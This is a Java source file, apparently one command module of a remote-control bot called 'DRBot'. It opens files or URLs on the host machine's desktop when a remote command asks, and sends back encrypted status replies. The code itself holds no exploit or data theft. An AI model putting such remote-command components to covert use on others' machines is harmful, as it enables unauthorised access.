package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.awt.Desktop;
import java.io.PrintWriter;
import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

/**
 *
 * @author MerNat
 */

public class open implements Runnable {
    
    private final PrintWriter writer;
    private final String[] fullCommand;
    private File fileOpen;
    private URI uriOpen;
    private final SecureLine secureLine;
    
    open(String[] commands,PrintWriter writer,SecureLine secureLine){
        this.writer = writer;
        this.secureLine = secureLine;
        fullCommand = new String[commands.length-1];
        for(int i=1;i<commands.length;i++){
            fullCommand[i-1] = commands[i];
        }
    }
    
    @Override
    public void run(){
        if(fullCommand.length==1 && fullCommand[0]!=null){
            fileOpen = new File(fullCommand[0].replace("*",":").replace("/","\\\\").replace("_"," "));
            if(fileOpen.exists()){
                try {
                    Desktop.getDesktop().open(fileOpen);
                    toPrint("[Open] File is opened.");
                } catch (IOException ex) {
                        toPrint("[Open] Error in Opening File.");
                }
            }
            else{
                    toPrint("[Open] File does'nt exist.");
            }
        }
        else
            if(fullCommand.length==2 && fullCommand[0].equals("browse") && fullCommand[1]!=null){
            try {
                uriOpen = new URI(fullCommand[1].replace("*",":"));
                Desktop.getDesktop().browse(uriOpen);
                toPrint("[Open Browser] URL is opened.");
            } catch (URISyntaxException ex) {
                    toPrint("[Open Browser] Syntax Error.");
                } catch (IOException ex) {
                    toPrint("[Open Browser] Error in Opening the site.");
            }
            }
    }
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
